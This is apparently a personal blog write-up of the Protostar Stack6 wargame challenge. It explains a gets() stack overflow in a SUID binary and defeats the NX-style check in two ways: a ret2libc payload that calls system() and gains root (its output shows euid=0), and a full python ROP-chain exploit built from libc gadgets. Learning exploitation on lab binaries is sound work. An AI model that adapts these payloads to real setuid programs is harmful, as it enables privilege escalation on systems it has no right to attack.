# --[ Introduction ]

So here we are again, for some reason I decided to start looking into binary exploitation again. I haven't seen this kinda stuff for a few years, and I guess I kinda missed it. I decided to delve in again with protostar!

I am going to be laying out the thought process that I followed to solve Protostar Stack 6! This post will look at solving stack6 with a ret2libc attack, and a future one using ROP. Let's do it!

# --[ The Challenge ]

So the challenge is pretty straightforward in terms of finding out what we have to do, and we're left with finding out how to do it. In particular, the vulnerable code is in this function:

```c
 6 void getpath() {
 8  char buffer[64];
 9  unsigned int ret;
11  printf("input path please: "); fflush(stdout);
12
13  gets(buffer);
14
15  ret = __builtin_return_address(0);
17  if((ret & 0xbf000000) == 0xbf000000) {
18    printf("bzzzt (%p)\n", ret);
19    _exit(1);
20  }
22  printf("got path %s\n", buffer);
23 }
```

Why is this vulnerable?! From `man gets`

> gets() is equivalent to fgets() with an infinite size and a stream of stdin [...] It is the caller's responsibility to ensure that the input line, if any, is sufficiently short to fit in the string

In other words, `gets` will keep reading until it encounters a newline with no bounds checking of any kind (also mentioned in the security notes of the man-page). This in turn is good news for us, however looking at line 17 we see a strange check. 

The check at line 17 is making sure that the return address of `getpath` does not start with `0xbf`. What's so special about addresses beginning with `0xbf`, I hear you ask. It turns out that addresses beggning with `0xbffff` are part of the stack [1][2], so really this check is trying to enforce a NX (non-executable) stack, so we can't just good-'ol point EIP to our buffer and execute any shellcode we want from the stack.

# --[ NX-stack ]

What exactly is an NX-Stack and why would the stack be NX ?! It is a binary exploitation mitigation, introduced to counter stack-based buffer overflows [3], along with stack canaries[4]. The general idea is that by marking the stack as Readable, Writeable and Non-Executable the processor is prevented from executing instructions from the stack (and hence potentially malicious input). In contrast, memory regions that contain code and are marked as Read-Only and Executable to avoid modification.

So now the game is somewhat harder, we need to defeat the NX-stack. There are two ways to do this, and I did both just to check that I could. The first way is by returning to a libc function of choice, and the broader category is known as ret2libc attacks. When this is not possible, you can result to crafting a Return-Oriented Programming (ROP) payload, but this is considerably harder and more time consuming. Both of these techniques assume that ASLR [5] is not enabled (and from now on we will assume it to be true for the rest of the article). 

# --[ Exploitation Setup ]

To make things easier for us, we need to do three things:

* enable coredumps: `$ ulimit -c unlimited`.
* enable SUID coredumps: `# echo 2 >/proc/sys/fs/suid_dumpable`.
* find a debugging instruction in the binary.

These will allow us to inspect the process when it crashes or hits a breakpoint, allowing us to verify our logic step by step. Debugger interrupt is `int 3` or `0xCC`, and we can look for one using `objdump`:

```
$ objdump -s ./stack6 | grep -e cc
8048248 1a000000 cc850408 04000000 11001000  ................
                 ^- here
```

Bingo, we were lucky found a break point on `0x0804824c`. Conveniently, this is in the `.text` section of the binary, so we should be able to call it without issues. 

Now we need to make our binary crash, and by trying a few different offsets we find that 84 bytes are enough to overwrite EIP. Let's test this with our our breakpoint:

```bash
$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08"' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
Trace/breakpoint trap (core dumped)
# gdb -q ./stack6 /tmp/core.5.stack6.1566 
Program terminated with signal 5, Trace/breakpoint trap.
#0  0x0804824d in ?? ()
(gdb) x/i $eip-1
0x804824c:	int3 
```

Another way to find this offset out would be to look at the assembly of the target function:

```arm
0x08048484 <getpath+0>:	    push   ebp
0x08048485 <getpath+1>:	    mov    ebp,esp
......
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax      
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
```

So we know that the stack exactly before `getpath` is called containes a return address (because of x86 calling conventions) and then we do a `push ebp`, increasing our offset from EIP by 4. After this, we see that `gets` (which expects a pointer to our buffer) is passed the address `ebp-0x4c` (`0x4c` is 76 in decimal), which tells us that our buffer starts at `ebp-0x4c`. Putting this together, we can see that our buffer is at `address_of_return_address_on_stack - 4 - 76`, making our total offset 80 bytes from the start of our buffer till we overwrite `getpath`'s return address on the stack. The diagram below shows the points of interest and the stack layout based on the conversation so far: 

```
 ________________ < ebp - 0x4c
|  our buffer    |
 ________________ < ebp 
|    old ebp     |
 ________________ < target no 1
| return address |
 ________________
| other things   |
| that don't     |
| matter         |
```

We now have a way to debug our logic, know what the memory layout looks like and can reliably trigger the bug!

# --[ Exploitation ]

So what actually is a ret2libc attack? This puzzled me for ages, but turns out it is reasonably straightforward. The idea is that basically after you take control of EIP  by means of an stack-based buffer overflow you can redirect the execution flow towards system functions found in libc. This is done by overwriting the return address stored on the stack with the your target function's entrypoint. This is the big picture, but of course there are more details to this and a very handy article to talk about this is [6].

In order to carry out our attack, we need to figure out the following:
* Which function to call ?!
* Where is the entrypoint of that ?!
* What does the stack need to look like or does it not matter (spoiler alert: it matters) ?!

Seeing as we are trying to escalate our priviledges, we should call the `system` function found in libc. Reading the manpage, `system` expects a command string to be supplied, so this will have to be somewhere on the stack as well! I will also include a call to `exit`, in order to honour the graceful-termination ethos amongst shellcoders. So then this is what we want the stack to look like

```
 ________________ < ebp - 0x4c
|  our buffer    |
|  should now    |
|  have /bin/sh  |
|  somewhere     |
 ________________ < ebp 
|    old ebp     |
 ________________
| system address |
 ________________
| exit   address |
 ________________
| pointer to     |
| /bin/sh        | 
 ________________
| other things   |
| that don't     |
| matter         |
```

Let's address the easy issues first, finding the addresses of `system` and `exit`. Using gdb:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Now for the part that confused me the most: how TF do I find `/bin/sh`? I saw a lot of people do it online by using a secondary program to create a few environment variables, and also the same technique was used in the book The Shellcoder's Handbook. Seeing as I am lazy (and also the thought of having to debug other people's C...), however, I thought it would be useful to do it another way. Since the memory is super predictable, I can just pass in `/bin/sh` as part of the input, find it on the stack, and then pass that address in. Let's try!

So the stack now has to look like:
```
 ________________ < ebp - 0x4c
|  our buffer    |
 ________________ < ebp 
|    old ebp     |
 ________________
| system address |
 ________________
| exit   address |
 ________________
| pointer to     |
| /bin/sh        |
 ________________
| /bin/sh string |
 ________________
| other things   |
| that don't     |
| matter         |
```

```bash
$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x2f\x62\x69\x6e\x2f\x73\x68"' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
Trace/breakpoint trap (core dumped)
# gdb -q ./stack6 /tmp/core.5.stack6.1799
Program terminated with signal 5, Trace/breakpoint trap.
(gdb) x/4x $esp
0xbffff800:	0x00000000	0x00000000	0x6e69622f	0x0068732f
(gdb) x/s 0xbffff808
0xbffff808:	 "/bin/sh"
```

And this is where things went wrong for me. Turns out, as described in [1], that gdb will setup some additional environment variables and that will impact the actual offsets of addresses on the stack when you run outside gdb. So whilst in GDB the address is `0xbffff808`, outside gdb it was `0xbffff7f8`. Putting all of this together, we have:

```bash
$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/usr/bin/id"'  | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`�����/usr/bin/id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

Sweet! Since `/usr/bin/id` shows we are root, effectively any program we run will run as root. We can run any program we run as root by simply modifying our exploit to run our target binary instead of `/usr/bin/id` like this:

```bash
python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/path/to/target"'
```

# Return Oriented Programming - ROP

## General Methodology

Right, time to get the big guns out! Before this challenge I had no idea how ROP worked and it still feels like it a bit, but now I have written one ROP-chain and I have found the many ways in which it can hurt you!

First off, some terminology:
* What is a gadget? It is a (usually) short sequence of assembly instructions, followed by a `ret` instruction.
* Why is this style of exploitation called ROP? because we make heavy use of the `ret` instruction.
* Why are we `ret`urning so much? 
* What is a ROP-chain? This is because we are chaining multiple gadgets togdther.
* Where are these gadgets? In memory because they are instructions already loaded in memory as part of the the binary's legitimate functionality. 

So in the simplest terms, ROP a shell-coding technique where various x86 instructions (gadgets) are stringed together using `ret` to jump to addresses found on the stack. This is feasible because once you have found the gadges you want to use, you push their addresses on stack as part of the input and then once the first gadget executes, it returns to the topmost address on the stack, causing execution to continue from the address of gadget 2, and then it return to the topmost address on the stack, causing gadget 3 to be executed, and so on. In essence your stack will mostly contain addresses and some data, but no shellcode. As an illustration:

```
 ________________ 
|  target buffer |
 ________________ < address of gadget 1
| return address |
 ________________ < address of gadget 2
| return address |
 ________________ < address of gadget 3
| return address |
 ________________
| other things   |
| that don't     |
| matter         |
```

If this all sounds kind of hard, then you're not alone - it is. Why would you choose to use ROP over ret2libc?! In a hardened system, you might not have access to system at all (i.e. it might have been compiled out), or you might be up against an ASCII-armoured system [7].

## Exploitation
### Setup

So how do you figure out which gadgets you need to use? This will depend on what you want to do. In our case, we're trying to execute an arbitrary program (just like with ret2libc) and the way we are going to do this is by using the `execve` syscall. From the man-page we need to setup a few registers for this to work and then perform a syscall interrupt:

```
EAX = 11 (or 0x0B in hex) – The execve syscall number
EBX = Address in memory of the string “/bin/sh”
ECX = Address of a pointer to the string “/bin/sh”, for our purposes
EDX = null, for our purposes
```

In order to figure out which gadgets we should use we will write our payload in assembly so that it will achieve the above steps, and then attempt to find the most relevant gadgets. Step one, write the assembly:

```arm
xor  edx, edx
push edx
mov  ecx, esp
mov  eax, 0xb
push 0x00     <---- fix this to contain /sh\x00
push 0x00     <---- fix this to contain /bin
mov  ebx, esp
int  0x80
```

Step two would be finding our gadgets! First lets look at the shared libraries that this binary is linking to by using gdb, so that we can search them for gadgets:
```bash
$ gdb -q ./stack6 
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Breakpoint 1, main (argc=1, argv=0xbffff864) at stack6/stack6.c:27
(gdb) info sharedlibrary 
From        To          Syms Read   Shared Object Library
0xb7fe3830  0xb7ff988f  Yes (*)     /lib/ld-linux.so.2
0xb7eada50  0xb7fa14cc  Yes (*)     /lib/libc.so.6
```

No surprises there, libc is everpresent! Now we basically just have to find gadgets in libc, and for that I used a tool called ROPgadget[8]. After we download libc from the protostar machine, run `ROPgadget --binary ../bin/libc.so.6 > libc_gadgets.txt` to extract gadgets from libc. And now let the most arduous process known to man begin - finding gadgets for our shellcode!

### Exploitation

As a first step, I tried to find the exact instructions that I needed but I had no luck. So then we need to find instructions that achieve what we want to do, and then fight any side-effects (spoiler alert again: there were). Keep in mind that we also have the stack available for use, so we can inject any data that we are missing or can't find in memory, giving us more options with regards to available gadgets.

I am not going to bore you with the exact process, so here's the final ROP chain:

```arm
0x1a9e   : pop edx ; ret					                    # setup the stack to contain 0x00 and pop to edx 
0x3900e  : and al, 8 ; add esp, 0xc ; ret			            # esp skips over our /tmp/sh data on the stack
0xc24f7  : push esp ; xor eax, eax ; pop ebx ; pop ebp ; ret	# moving esp to ebx
0x12acce : dec ebx ; ret 					                    # repeated a few times to get correct ebx value
0xcaf24  : add ecx, ebx ; ret					                # set ecx = ebx for pointer to NULL
0x97193  : mov eax, 0xb ; int 0x80 				                # syscall
```

For this to work, we need the input (and by proxy the stack) to look like this:

```
 ________________ < ebp - 0x4c
|  padding       |
 ________________ < ebp
| 0x1a9e         | <- pop edx ; ret
 ________________ 
|\x00\x00\x00\x00| <- value of edx
 ________________ 
| 0x3900e        | <- and al, 8 ; add esp, 0xc ; ret
 ________________ 
| /tmp           | <- skip over this (esp + 0x4)
 ________________ 
| /sh\x00        | <- skip over this (esp + 0x8)
 ________________ 
|\x00\x00\x00\x00| <- skip over this (esp + 0xc)
 ________________ 
| 0xc24f7        | <- push esp ; xor eax, eax ; pop ebx ; pop ebp
 ________________ 
|\x00\x00\x00\x00| <- this goes onto ebp, side-effect
 ________________ 
| 0x12acce       | <- dec ebx -- repeated 9 times, so that the gadget executes 9 times, used to setup ebx to point to /tmp/sh
 ________________ 
| 0xcaf24        | <- make ecx point to \x00\x00\x00\x00 because it needs to be a pointer to NULL
 ________________ 
| 0x12acce       | <- dec ebx  -- repeated 7 times, so that the gadget executes 7 times
 ________________ 
| 0x97193        | <- mov eax, 0xb ; int 0x80
```

Right, almost there! The last thing we need to do now is find out where libc is loaded in memory when the binary runs. Notice that the gadget instructions above are *relative* offsets into libc, so to get their absolute address and use them we must compute for each one the value `libc_base + gadget_libc_offset`. We will need to inspect the processe's process memory maps for this:

```bash
$ ps aux | grep -e '[s]tack6'
root      2265  0.0  0.0   1536   320 pts/1    S+   01:37   0:00 /opt/protostar/bin/stack6
# cat /proc/2265/maps
....
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so <-- this
....
```

So it looks like libc is loaded at base address `0xb7e97000`. Putting all of this together, here's my final exploit:

```python
import struct
import sys

def l(n):
    lib_c_base = 0xb7e97000
    return p(lib_c_base + n)

def p (i):
    return struct.pack('I', i)

padding = "A" * 80
pop_edx = l(0x1a9e)
NULL="\x00\x00\x00\x00"
add_esp_12 = l(0x3900e)
tmpsh_str = "/tmp/sh\x00\x00\x00\x00\x00"
push_esp = l(0xc24f7)
dec_ebx = l(0x12acce)
add_ecx_ebx = l(0xcaf24)
set_eax_interrupt = l(0x97193)

fmt = "{0}{1}{2}{3}{4}{5}{2}" + "{6}"*9 + "{8}" + "{6}"*7 +"{7}"
payload = fmt.format(padding, pop_edx, NULL, add_esp_12, tmpsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip()
sys.stdout.write(payload)
sys.stdout.flush()
```

Notice above that my target is `/tmp/sh`, not `/bin/sh`. I had problems getting `/bin/sh` to work and get an active session, so instead I compiled my own program and made it verify my shinny new root access :)



# --[ CLOSING THOUGHTS ]

Finally the end! I think writing this post was as long as learning to do the exploit!

Some takeaway lessons that I found the hard way:

* NULL pointer != pointer to NULL; I got bit hard by this one, as a lot of blogs mentioned that ECX could be null so I just set it to NULL. Instead it want's to be a pointer to NULL. 
* `push _arg_ ; ret ;` instructions are the devil. `ret` will return to whatever we just, so generally these instructions are not the most useful. 
* gdb will mess you around. Twice for me, once when I was looking for the offsets of my variable in ret2libc and then when I was trying to find out the libc base for my ROP-chain.
* all bytes are 8 bits, but not all bytes are equal. We were lucky here with exploiting `gets`, but in general we would not be able to freely put NULL bytes into the input.
* I wasted a lot of time trying to decide between python 2 and 3. God damn.


# --[ SOURCES ]

[1] - https://stackoverflow.com/a/17775966/1366384
[2] - https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
[3] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Nonexecutable_stack
[4] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries
[5] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Randomization
[6] - https://www.shellblade.net/files/docs/ret2libc.pdf
[7] - https://security.stackexchange.com/questions/36462/
[8] - https://github.com/JonathanSalwan/ROPgadget